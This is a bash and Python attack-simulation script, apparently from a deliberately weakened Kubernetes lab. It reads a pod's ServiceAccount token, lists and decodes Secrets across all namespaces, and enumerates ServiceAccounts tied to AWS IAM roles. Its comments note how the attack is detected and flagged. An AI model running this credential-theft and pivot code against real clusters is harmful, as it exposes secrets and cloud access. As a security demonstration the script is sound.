#!/usr/bin/env bash
# ATTACK: demonstrate the cluster-admin blast radius FROM INSIDE the app pod.
#
#   bash security/attack-simulation/04_pod_cluster_admin.sh
#
# Runs itself inside the running pod via kubectl exec, so it needs no shell
# session and nothing is installed on the container.
#
# Uses python rather than curl: the app image is python:3.11-slim and has no
# curl, so the previous curl-based version of this script failed at the first
# line when run for real.
#
# DETECTED BY: EKS control-plane audit logs -- the ServiceAccount reading
#   cluster-wide Secrets is recorded in /aws/eks/text2sql-eks/cluster.
# FLAGGED BY: the Kyverno audit policy disallow-cluster-admin-serviceaccounts
#   (`kubectl get cpolr`), which names this exact binding.
# NOT PREVENTED: nothing stops it. The binding is the required weakness.
set -euo pipefail

NS=text2sql
DEPLOY=deploy/text2sql

# -i so the heredoc is forwarded to the container's stdin; without it kubectl
# attaches no stdin and `python -` reads an empty program and exits silently.
kubectl -n "$NS" exec -i "$DEPLOY" -- python - <<'PY'
import json, os, ssl, urllib.request

SA = "/var/run/secrets/kubernetes.io/serviceaccount"
API = "https://kubernetes.default.svc"

# Step 1: the credential Kubernetes mounted into this pod automatically.
# Nothing in the app ever asked for it and the app never calls the K8s API.
with open(f"{SA}/token") as f:
    token = f.read().strip()
print(f"[*] Read the ServiceAccount token from {SA}/token")
print(f"    {len(token)} bytes, readable as uid {os.getuid()} with a read-only root FS\n")

ctx = ssl.create_default_context(cafile=f"{SA}/ca.crt")

def api(path):
    req = urllib.request.Request(API + path, headers={"Authorization": f"Bearer {token}"})
    return json.load(urllib.request.urlopen(req, context=ctx, timeout=15))

# Step 2: read every Secret in every namespace.
print("[*] Listing Secrets across ALL namespaces with that token:")
for item in api("/api/v1/secrets")["items"]:
    m = item["metadata"]
    print(f"    {m['namespace']:<12} {m['name']}")

# Step 3: decode the one that matters. Kubernetes Secrets are base64, not
# encrypted -- anything that can read them can read their contents.
print("\n[*] Decoding text2sql/text2sql-secrets:")
import base64
data = api("/api/v1/namespaces/text2sql/secrets/text2sql-secrets")["data"]
for k, v in sorted(data.items()):
    val = base64.b64decode(v).decode(errors="replace")
    if k == "MONGODB_URI":
        import re
        val = re.sub(r"(mongodb://[^:]+):[^@]+@", r"\1:<THE DB PASSWORD>@", val)
    else:
        val = val[:6] + "<redacted>"
    print(f"    {k} = {val}")

# Step 4: the IRSA pivot. cluster-admin can create a pod with ANY
# ServiceAccount, including ones annotated with an AWS IAM role.
print("\n[*] ServiceAccounts annotated with an AWS IAM role (the pivot into AWS):")
for sa in api("/api/v1/serviceaccounts")["items"]:
    arn = (sa["metadata"].get("annotations") or {}).get("eks.amazonaws.com/role-arn")
    if arn:
        print(f"    {sa['metadata']['namespace']}/{sa['metadata']['name']}")
        print(f"      -> {arn}")

print("\n[!] One internet-facing pod: every Secret in the cluster, the database")
print("    credentials, and a ServiceAccount whose IAM role can modify any")
print("    security group in the account.")
PY
